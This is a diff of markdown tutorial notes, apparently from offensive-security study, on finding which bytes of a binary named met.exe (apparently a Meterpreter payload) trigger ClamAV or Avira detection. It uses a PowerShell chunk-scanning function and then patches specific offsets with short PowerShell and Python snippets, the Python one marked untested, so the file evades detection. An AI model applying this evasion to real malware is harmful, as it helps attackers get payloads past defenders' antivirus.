@@ -1,11 +1,11 @@
 # Locating Signatures in Files
+<details>
+  <summary>Expand</summary>
 Free AV products: ClamAV, Avira
 
 We must determine the exact bytes that are triggering detection. For this we cut the binary into smaller pieces and scan them.
 For this we use a PowerShell function [Find-AVSignature](http://obscuresecurity.blogspot.com/2012/12/finding-simple-av-signatures-with.html):
 
-i<details>
-  <summary>Expand</summary>
 ```powershell
 function Find-AVSignature {
 <#
@@ -128,7 +128,6 @@ function Find-AVSignature {
 
 ```
 
-</details>
 
 First import it:
 
@@ -143,5 +142,57 @@ We will set each segment to 10000 bytes.
 ```
 Find-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest1 -Verbose -Force
 ```
+
+Next run AV Scan against created folder avtest1
+Let's assume the segment from 0 to 10000 is ok and the following are flagged as malicious.
+Next adjust start and end bytes as well as the interval (getting smaller)
+
+```powershell
+Find-AVSignature -StartByte 10000 -EndByte 20000 -Interval 1000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest2 -Verbose -Force
+```
+Repeat the step until you find the exact byte that triggers AV.
+Set this byte to 0 with the following scripts:
+
+
+PowerShell:
+```powershell
+$bytes  = [System.IO.File]::ReadAllBytes("C:\Tools\met.exe")
+$bytes[18867] = 0
+[System.IO.File]::WriteAllBytes("C:\Tools\met_mod.exe", $bytes)
+```
+Python (not tested, generated with ChatGPT):
+```python
+source_path = r"C:\Tools\met.exe"
+destination_path = r"C:\Tools\met_mod.exe"
+
+# Read all bytes from the source file
+with open(source_path, "rb") as f:
+    bytes = bytearray(f.read())
+
+# Modify the byte at index 18867 to 0
+bytes[18867] = 0
+
+# Write the modified bytes to the destination file
+with open(destination_path, "wb") as f:
+    f.write(bytes)
+
+print("File modification complete.")
+
+```
+Repeat the last step to verify that AV does not detect the segment anymore.
+Afterwards, take the modified binary and repeat all over to check if there are other bytes that trigger AV.
+After finding all bytes to evade detection, the file is still detected by AV. We can evade this by changing the last byte at offset 73801.
+Changing it to 0x00 does not produce a clean scan, but changing it to 0xFF does. 
+
+```powershell
+$bytes  = [System.IO.File]::ReadAllBytes("C:\Tools\met.exe")
+$bytes[18867] = 0
+$bytes[18987] = 0
+$bytes[73801] = 0xFF
+[System.IO.File]::WriteAllBytes("C:\Tools\met_mod.exe", $bytes)
+```
+
+</details>
+
 
 
